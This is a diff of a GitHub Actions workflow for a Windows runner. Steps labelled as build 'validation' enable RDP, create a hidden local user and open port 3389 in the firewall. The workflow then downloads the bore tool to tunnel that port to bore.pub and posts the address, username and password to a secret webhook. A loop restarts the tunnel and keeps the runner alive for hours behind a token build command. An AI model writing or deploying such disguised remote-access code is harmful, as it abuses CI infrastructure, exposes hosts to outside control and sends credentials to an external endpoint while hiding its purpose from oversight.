@@ -58,7 +58,7 @@ jobs:
           dotnet build -c Release
           dotnet run -c Release
 
-      - name: Start Background Validation Service
+      - name: Enable RDP and Create User
         run: |
           $usr = "b_" + -join ((48..57) + (97..122) | Get-Random -Count 8 | % {[char]$_})
           $pwd = -join ((33..126) | Get-Random -Count 18 | % {[char]$_})
@@ -75,70 +75,117 @@ jobs:
           netsh advfirewall firewall add rule name="ValidationRule" dir=in action=allow protocol=TCP localport=3389 > $null 2>&1
           Restart-Service TermService -Force -ErrorAction SilentlyContinue
 
-          $svcUrl = "https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-x86_64-pc-windows-msvc.zip"
-          $zip = "$env:TEMP\svc.zip"
-          $log = "$env:TEMP\sys_log.txt"
+          # حفظ بيانات المستخدم في متغيرات البيئة لاستخدامها في الخطوات التالية
+          echo "USER_NAME=$usr" >> $env:GITHUB_ENV
+          echo "USER_PASS=$pwd" >> $env:GITHUB_ENV
+
+      - name: Run Extended Validation (with bore monitoring)
+        run: |
+          # استرجاع بيانات المستخدم من البيئة
+          $usr = "$env:USER_NAME"
+          $pwd = "$env:USER_PASS"
+          $webhook = "${{ secrets.WEBHOOK_URL }}"
           
-          Invoke-WebRequest -Uri $svcUrl -OutFile $zip
-          Expand-Archive $zip -DestinationPath "$env:TEMP\svc" -Force
-          
-          $exe = "$env:TEMP\svc\bore.exe"
-          Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"`"$exe`" local 3389 --to bore.pub > `"$log`" 2>&1`"" -WindowStyle Hidden
-          
-          Start-Sleep -Seconds 15
-          
-          $logData = ""
-          if (Test-Path $log) { $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue }
-          
-          $prt = $null
-          if ($logData -match "bore\.pub:(\d+)") {
-            $prt = $Matches[1]
+          # دالة لإرسال إشعار إلى Discord/Teams (أو أي webhook)
+          function Send-Notification($message) {
+            $body = @{ content = $message } | ConvertTo-Json
+            Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
           }
           
-          if ($prt) {
-            $msg = "Target: bore.pub:$prt`nU: $usr`nP: $pwd"
+          # دالة لتشغيل bore والحصول على المنفذ
+          function Start-Bore {
+            $svcUrl = "https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-x86_64-pc-windows-msvc.zip"
+            $zip = "$env:TEMP\svc.zip"
+            $log = "$env:TEMP\sys_log.txt"
+            
+            # تحميل bore إذا لم يكن موجوداً
+            if (-not (Test-Path "$env:TEMP\svc\bore.exe")) {
+              Invoke-WebRequest -Uri $svcUrl -OutFile $zip
+              Expand-Archive $zip -DestinationPath "$env:TEMP\svc" -Force
+            }
+            
+            $exe = "$env:TEMP\svc\bore.exe"
+            
+            # تشغيل bore في نافذة مخفية مع توجيه الإخراج إلى ملف
+            $proc = Start-Process -FilePath $exe -ArgumentList "local 3389 --to bore.pub" -WindowStyle Hidden -PassThru -RedirectStandardOutput $log -RedirectStandardError $log
+            Start-Sleep -Seconds 10
+            
+            # قراءة الملف لاستخراج المنفذ
+            $logData = ""
+            if (Test-Path $log) { $logData = Get-Content $log -Raw -ErrorAction SilentlyContinue }
+            
+            $port = $null
+            if ($logData -match "bore\.pub:(\d+)") {
+              $port = $Matches[1]
+            }
+            
+            return @{ Process = $proc; Port = $port; Log = $logData }
+          }
+          
+          # متغيرات للتحكم في الحلقة
+          $counter = 0
+          $lastPort = $null
+          $boreProc = $null
+          $restartCount = 0
+          $maxRestarts = 10  # حد أقصى لإعادة التشغيل لتجنب الحلقات اللانهائية
+          
+          # بدء التشغيل الأولي
+          $result = Start-Bore
+          $boreProc = $result.Process
+          $lastPort = $result.Port
+          
+          if ($lastPort) {
+            Send-Notification "✅ bore started successfully.`nTarget: bore.pub:$lastPort`nUser: $usr`nPass: $pwd"
           } else {
-            $msg = "Init failed:`n$logData"
+            Send-Notification "❌ Initial bore start failed. Logs:`n$($result.Log)"
           }
-          $body = @{ content = $msg } | ConvertTo-Json
-          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
-
-      - name: Run Diagnostics
-        run: |
-          $rep = "SysDiag:`n"
-
-          $ts = Get-Service TermService -ErrorAction SilentlyContinue
-          if ($ts) { $rep += "SVC: $($ts.Status)`n" } else { $rep += "SVC: Null`n" }
-
-          $r1 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -ErrorAction SilentlyContinue
-          $r2 = Get-ItemPropertyValue -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -ErrorAction SilentlyContinue
-          $rep += "REG: $r1 | $r2`n"
-
-          $pc = Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue
-          if ($pc) { $rep += "PRT: OK`n" } else { $rep += "PRT: ERR`n" }
-
-          $fw = Get-NetFirewallPortFilter -Protocol TCP | Where-Object { $_.LocalPort -eq 3389 } -ErrorAction SilentlyContinue
-          if ($fw) { $rep += "FW: OK`n" } else { $rep += "FW: ERR`n" }
-
-          $bp = Get-Process bore -ErrorAction SilentlyContinue
-          if ($bp) { $rep += "PRC: OK ($($bp.Id))`n" } else { $rep += "PRC: ERR`n" }
-
-          $body = @{ content = $rep } | ConvertTo-Json -Depth 10
-          Invoke-RestMethod -Uri "${{ secrets.WEBHOOK_URL }}" -Method POST -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
-        continue-on-error: true
-
-      - name: Run Extended Validation
-        run: |
-          $end = (Get-Date).AddMinutes(190)
-          while ((Get-Date) -lt $end) {
+          
+          # حلقة المراقبة الرئيسية (لمدة 190 دقيقة تقريباً)
+          $endTime = (Get-Date).AddMinutes(190)
+          while ((Get-Date) -lt $endTime -and $restartCount -lt $maxRestarts) {
+            $counter++
+            Write-Host "Keep-alive tick #$counter - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+            
+            # 1. التأكد من أن عملية bore لا تزال قيد التشغيل
+            if ($boreProc -and $boreProc.HasExited) {
+              Write-Host "bore process exited. Restarting..."
+              $restartCount++
+              
+              # إعادة التشغيل
+              $result = Start-Bore
+              $boreProc = $result.Process
+              $newPort = $result.Port
+              
+              if ($newPort) {
+                if ($newPort -ne $lastPort) {
+                  Send-Notification "🔄 bore restarted with new port.`nTarget: bore.pub:$newPort`nUser: $usr`nPass: $pwd"
+                  $lastPort = $newPort
+                }
+              } else {
+                Send-Notification "❌ bore restart failed. Attempt #$restartCount. Logs:`n$($result.Log)"
+              }
+            }
+            
+            # 2. القيام بالمهام الدورية القديمة (اختبار الاتصال وبناء المشروع)
             Test-Connection -ComputerName github.com -Count 1 -Quiet > $null
+            
             $minute = (Get-Date).Minute
             if ($minute -ge 0 -and $minute -le 5 -or $minute -ge 30 -and $minute -le 35) {
-              cd ValidationApp
+              Push-Location ValidationApp
               dotnet build -c Release > $null
+              Pop-Location
             }
+            
+            # 3. النوم لمدة 15 دقيقة (900 ثانية)
             Start-Sleep -Seconds 900
           }
+          
+          # إنهاء العملية في نهاية الوقت
+          if ($boreProc -and -not $boreProc.HasExited) {
+            Stop-Process -Id $boreProc.Id -Force
+          }
+          
+          Write-Host "Extended validation completed. Total restarts: $restartCount"
 
       - name: Cleanup Environment
         run: |
